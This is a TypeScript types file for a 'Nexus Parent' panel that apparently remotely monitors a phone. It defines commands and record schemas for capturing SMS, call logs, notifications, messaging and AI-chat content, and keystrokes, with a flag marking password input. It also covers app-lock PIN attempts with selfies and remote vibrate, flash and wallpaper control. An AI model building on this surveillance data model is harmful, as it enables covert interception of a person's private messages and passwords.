/**
 * @file types.ts
 * @description Type definitions for Nexus Parent Right Sidebar.
 *
 * Hey friend! This centralizes all panel configurations, item schemas,
 * DataChannel command protocols, and formatting utilities for the right-hand
 * inspection and hardware control panels (SMS, Call Log, Notifications, Apps).
 */

export type RightSidebarPanelId =
  | 'sms'
  | 'calllog'
  | 'notification'
  | 'keyboard'
  | 'whatsapp'
  | 'telegram'
  | 'chatgpt'
  | 'claude'
  | 'grok'
  | 'chats'
  | 'gmail'
  | 'facebook'
  | 'instagram'
  | 'snapchat'
  | 'wellbeing'
  | 'applock'
  | 'vibrateflash'
  | 'wallpaper';

export type RightSidebarListener = () => void;

/**
 * Monitoring State Machine for hardware telemetry panels (SMS, Call Log, etc.).
 */
export type MonitoringState = 'IDLE' | 'STARTING' | 'LIVE' | 'STOPPING';

/**
 * Metadata configuration for each right sidebar panel.
 */
export interface PanelConfig {
  title: string;
  badge: string;
  render: () => HTMLElement;
}

// -----------------------------------------------------------------------------
// CALL LOG PROTOCOL & TYPES
// -----------------------------------------------------------------------------

export const CMD_CALLLOG_ON = 'CALLLOG_ON';
export const CMD_CALLLOG_OFF = 'CALLLOG_OFF';
export const ALIAS_CALLLOG_START = 'CALLLOG_START';
export const ALIAS_CALLLOG_STOP = 'CALLLOG_STOP';

export const RESP_CALLLOG_STARTED = 'CALLLOG_STARTED';
export const RESP_CALLLOG_STOPPED = 'CALLLOG_STOPPED';
export const RESP_CALLLOG_ERROR_PREFIX = 'CALLLOG_ERROR: ';

export const TYPE_CALLLOG_HISTORY = 'CALLLOG_HISTORY';
export const TYPE_CALLLOG_NEW = 'CALLLOG_NEW';

export type CallDirectionType =
  | 'incoming'
  | 'outgoing'
  | 'missed'
  | 'rejected'
  | 'blocked'
  | 'voicemail'
  | 'external'
  | 'unknown';

export interface CallRecord {
  id: string;
  number: string;
  name: string;
  numberType: string;
  callType: CallDirectionType;
  duration: number; // in seconds
  timestamp: number; // unix epoch millis
  location?: string;
  simId?: string;
  features?: string[];
  isRead?: boolean;
}

// Legacy alias for existing static mocks
export interface CallLogItem {
  name: string;
  number: string;
  type: 'incoming' | 'outgoing' | 'missed';
  duration: string;
  time: string;
}

// -----------------------------------------------------------------------------
// SMS PROTOCOL & TYPES
// -----------------------------------------------------------------------------

export const CMD_SMS_ON = 'SMS_ON';
export const CMD_SMS_OFF = 'SMS_OFF';
export const ALIAS_SMS_START = 'SMS_START';
export const ALIAS_SMS_STOP = 'SMS_STOP';

export const RESP_SMS_STARTED = 'SMS_STARTED';
export const RESP_SMS_STOPPED = 'SMS_STOPPED';
export const RESP_SMS_ERROR_PREFIX = 'SMS_ERROR: ';

export const TYPE_SMS_HISTORY = 'SMS_HISTORY';
export const TYPE_SMS_NEW = 'SMS_NEW';

export type SmsDirectionType = 'inbox' | 'sent' | 'draft' | 'failed' | 'unknown';

export interface SmsRecord {
  id: string;
  address: string;
  senderName: string;
  body: string;
  smsType: SmsDirectionType;
  timestamp: number; // unix epoch millis
  dateSent?: number;
  read?: boolean;
  simId?: string;
}

// Legacy alias for existing static mocks
export interface SmsItem {
  sender: string;
  text: string;
  time: string;
  unread: boolean;
}

// -----------------------------------------------------------------------------
// NOTIFICATION PROTOCOL & TYPES
// -----------------------------------------------------------------------------

export const CMD_NOTIFICATION_ON = 'NOTIFICATION_ON';
export const CMD_NOTIFICATION_OFF = 'NOTIFICATION_OFF';
export const ALIAS_NOTIFICATION_START = 'NOTIFICATION_START';
export const ALIAS_NOTIFICATION_STOP = 'NOTIFICATION_STOP';

export const RESP_NOTIFICATION_STARTED = 'NOTIFICATION_STARTED';
export const RESP_NOTIFICATION_STOPPED = 'NOTIFICATION_STOPPED';
export const RESP_NOTIFICATION_ERROR_PREFIX = 'NOTIFICATION_ERROR: ';

export const TYPE_NOTIFICATION_SNAPSHOT = 'NOTIFICATION_SNAPSHOT';
export const TYPE_NOTIFICATION_NEW = 'NOTIFICATION_NEW';
export const TYPE_NOTIFICATION_REMOVED = 'NOTIFICATION_REMOVED';

export interface NotificationMessageItem {
  sender: string;
  text: string;
  timestamp: number;
  dataMimeType?: string;
  dataUri?: string;
}

export interface NotificationRecord {
  id: number;
  key: string;
  packageName: string;
  appName: string;
  title: string;
  text: string;
  bigText?: string;
  subText?: string;
  summaryText?: string;
  infoText?: string;
  category: string;
  channelId?: string;
  postTime: number; // unix epoch millis
  isOngoing?: boolean;
  isClearable?: boolean;
  groupKey?: string;
  actions?: string[];
  messages?: NotificationMessageItem[];
}

// -----------------------------------------------------------------------------
// OTHER PANEL SCHEMAS
// -----------------------------------------------------------------------------

export interface NotificationItem {
  app: string;
  title: string;
  desc: string;
  time: string;
  pkg: string;
}

// -----------------------------------------------------------------------------
// KEYBOARD PROTOCOL & TYPES
// -----------------------------------------------------------------------------

export const CMD_KEYBOARD_ON = 'KEYBOARD_ON';
export const CMD_KEYBOARD_OFF = 'KEYBOARD_OFF';
export const ALIAS_KEYBOARD_START = 'KEYBOARD_START';
export const ALIAS_KEYBOARD_STOP = 'KEYBOARD_STOP';

export const RESP_KEYBOARD_STARTED = 'KEYBOARD_STARTED';
export const RESP_KEYBOARD_STOPPED = 'KEYBOARD_STOPPED';
export const RESP_KEYBOARD_ERROR_PREFIX = 'KEYBOARD_ERROR: ';

export const TYPE_KEYBOARD_SNAPSHOT = 'KEYBOARD_SNAPSHOT';
export const TYPE_KEYBOARD_NEW = 'KEYBOARD_NEW';

export interface KeyloggerItem {
  app: string;
  query: string;
  time: string;
}

export interface KeyboardRecord {
  id: string;
  app: string;
  appName: string;
  text: string;
  fieldHint?: string;
  fieldId?: string;
  inputType: string;
  isPassword: boolean;
  timestamp: number;
}

export interface ChatItem {
  name: string;
  snippet: string;
  time: string;
  unread?: number;
}

export interface AiPromptItem {
  ai: string;
  prompt: string;
  time: string;
}

export interface WellbeingAppItem {
  app: string;
  time: string;
  percent: number;
}

// -----------------------------------------------------------------------------
// APP LOCK PROTOCOL & TYPES
// -----------------------------------------------------------------------------

export const CMD_APPLOCK_ON = 'APPLOCK_ON';
export const CMD_APPLOCK_OFF = 'APPLOCK_OFF';
export const RESP_APPLOCK_STARTED = 'APPLOCK_STARTED';
export const RESP_APPLOCK_STOPPED = 'APPLOCK_STOPPED';
export const RESP_APPLOCK_ERROR_PREFIX = 'APPLOCK_ERROR: ';

export const TYPE_APPLOCK_SNAPSHOT = 'APPLOCK_SNAPSHOT';
export const TYPE_APPLOCK_NEW = 'APPLOCK_NEW';

export const CMD_APPLOCK_TOGGLE = 'APPLOCK_TOGGLE';
export const CMD_APPLOCK_SET_PIN = 'APPLOCK_SET_PIN';
export const CMD_APPLOCK_CLEAR = 'APPLOCK_CLEAR';
export const CMD_APPLOCK_GET_STATUS = 'APPLOCK_GET_STATUS';

export const RESP_APPLOCK_STATUS = 'APPLOCK_STATUS';
export const RESP_APPLOCK_PIN_CHANGED = 'APPLOCK_PIN_CHANGED';

export interface AppLockRecord {
  id: string;
  timestamp: number;
  pinCorrect: boolean;
  failedAttempts: number;
  isLockedOut: boolean;
  selfie?: string | null;
}

export interface AppLockItem {
  name: string;
  pkg: string;
  locked: boolean;
}

// -----------------------------------------------------------------------------
// WALLPAPER PROTOCOL & TYPES
// -----------------------------------------------------------------------------

export const CMD_WALLPAPER_ON = 'WALLPAPER_ON';
export const CMD_WALLPAPER_OFF = 'WALLPAPER_OFF';
export const CMD_WALLPAPER_GET = 'WALLPAPER_GET';
export const ALIAS_WALLPAPER_START = 'WALLPAPER_START';
export const ALIAS_WALLPAPER_STOP = 'WALLPAPER_STOP';

export const RESP_WALLPAPER_STARTED = 'WALLPAPER_STARTED';
export const RESP_WALLPAPER_STOPPED = 'WALLPAPER_STOPPED';
export const RESP_WALLPAPER_ERROR_PREFIX = 'WALLPAPER_ERROR: ';

export const TYPE_WALLPAPER_CHUNK = 'WALLPAPER_CHUNK';
export const CMD_PUSH_WALLPAPER_START = 'PUSH_WALLPAPER_START';
export const CMD_PUSH_WALLPAPER_CHUNK = 'PUSH_WALLPAPER_CHUNK';
export const RESP_WALLPAPER_SET_SUCCESS = 'WALLPAPER_SET_SUCCESS';
export const RESP_WALLPAPER_SET_ERROR_PREFIX = 'WALLPAPER_SET_ERROR: ';

export type WallpaperTarget = 'home' | 'lock' | 'both';

export interface WallpaperChunkPayload {
  type: typeof TYPE_WALLPAPER_CHUNK;
  screen: 'home' | 'lock';
  chunkIndex: number;
  totalChunks: number;
  data: string;
  isSame: boolean;
}

export interface WallpaperDataState {
  homeUrl: string | null;
  lockUrl: string | null;
  isSame: boolean;
  currentTarget: WallpaperTarget;
  isFetching: boolean;
  isPushing: boolean;
  pushProgress: number; // 0..100
}

// -----------------------------------------------------------------------------
// VIBRATE & FLASH PROTOCOL & TYPES
// -----------------------------------------------------------------------------

export const CMD_VIBRATE_PREFIX = 'VIBRATE:';
export const CMD_FLASH_PREFIX = 'FLASH:';
export const CMD_VIBRATE_FLASH_PREFIX = 'VIBRATE_FLASH:';
export const CMD_STOP_VIBRATE_FLASH = 'STOP_VIBRATE_FLASH';

export const RESP_VIBRATE_SUCCESS_PREFIX = 'VIBRATE_SUCCESS: ';
export const RESP_VIBRATE_ERROR_PREFIX = 'VIBRATE_ERROR: ';
export const RESP_FLASH_SUCCESS_PREFIX = 'FLASH_SUCCESS: ';
export const RESP_FLASH_ERROR_PREFIX = 'FLASH_ERROR: ';
export const RESP_VIBRATE_FLASH_SUCCESS_PREFIX = 'VIBRATE_FLASH_SUCCESS: ';
export const RESP_VIBRATE_FLASH_ERROR_PREFIX = 'VIBRATE_FLASH_ERROR: ';

export type VibratePattern = 'short' | 'double' | 'pulse' | 'sos';
export type FlashAction = 'on' | 'off' | 'strobe' | 'beacon';
export type CombinedPattern = 'alert' | 'sos' | 'pulse';

export interface VibrateFlashStatusState {
  lastAction: string | null;
  lastSuccess: boolean | null;
  statusMessage: string | null;
  timestamp: number;
}

// -----------------------------------------------------------------------------
// FORMATTING HELPERS
// -----------------------------------------------------------------------------

/**
 * Normalizes raw or legacy SIM identifiers (e.g. "0", "1", "2", "SIM 5", "sub_id")
 * into clean, human-readable labels like "SIM 1", "SIM 2", or "SIM 1 • Jio".
 * Ensures bare numbers or cryptic database IDs are never displayed.
 */
export function formatSimSlot(rawSim?: string): string {
  if (!rawSim || typeof rawSim !== 'string') return '';
  const trimmed = rawSim.trim();
  if (!trimmed) return '';

  // If already rich formatted (e.g. "SIM 1 • Jio" or "SIM 2 • Airtel")
  if (/^SIM\s+\d+\s*•/i.test(trimmed)) {
    return trimmed;
  }

  // If already cleanly "SIM 1" or "SIM 2"
  if (/^SIM\s+[12]$/i.test(trimmed)) {
    return trimmed.toUpperCase();
  }

  // If it's "SIM 5", "SIM 0", etc. - clean up legacy sub_id artifacts
  const simMatch = trimmed.match(/^SIM\s+(\d+)$/i);
  if (simMatch) {
    const num = parseInt(simMatch[1], 10);
    if (num === 0 || num === 1) return 'SIM 1';
    if (num === 2) return 'SIM 2';
    // Fallback for subIds: even is slot 2, odd is slot 1
    return num % 2 === 0 ? 'SIM 2' : 'SIM 1';
  }

  // If raw integer string like "0", "1", "2", "5"
  const intVal = parseInt(trimmed, 10);
  if (!isNaN(intVal) && String(intVal) === trimmed) {
    if (intVal === 0 || intVal === 1) return 'SIM 1';
    if (intVal === 2) return 'SIM 2';
    return intVal % 2 === 0 ? 'SIM 2' : 'SIM 1';
  }

  return trimmed;
}

/**
 * Formats duration in seconds to standard MM:SS string (e.g. 185s -> "03:05").
 */
export function formatCallDuration(seconds: number): string {
  if (isNaN(seconds) || seconds <= 0) return '00:00';
  const mins = Math.floor(seconds / 60);
  const secs = Math.floor(seconds % 60);
  return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
}

/**
 * Converts unix timestamp in millis to relative human-readable string.
 */
export function formatRelativeTime(timestamp: number): string {
  if (!timestamp || isNaN(timestamp)) return '--';
  const now = Date.now();
  const diffSec = Math.floor((now - timestamp) / 1000);

  if (diffSec < 10) return 'Just now';
  if (diffSec < 60) return `${diffSec}s ago`;
  const diffMin = Math.floor(diffSec / 60);
  if (diffMin < 60) return `${diffMin}m ago`;
  const diffHours = Math.floor(diffMin / 60);
  if (diffHours < 24) {
    const d = new Date(timestamp);
    return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
  }
  const diffDays = Math.floor(diffHours / 24);
  if (diffDays === 1) return 'Yesterday';
  if (diffDays < 7) return `${diffDays}d ago`;

  const d = new Date(timestamp);
  return d.toLocaleDateString([], { month: 'short', day: 'numeric' });
}

/**
 * Formats timestamp to full detailed date string.
 */
export function formatFullDateTime(timestamp: number): string {
  if (!timestamp || isNaN(timestamp)) return '--';
  const d = new Date(timestamp);
  const dateStr = d.toLocaleDateString([], { month: 'short', day: 'numeric', year: 'numeric' });
  const timeStr = d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
  return `${dateStr} • ${timeStr}`;
}
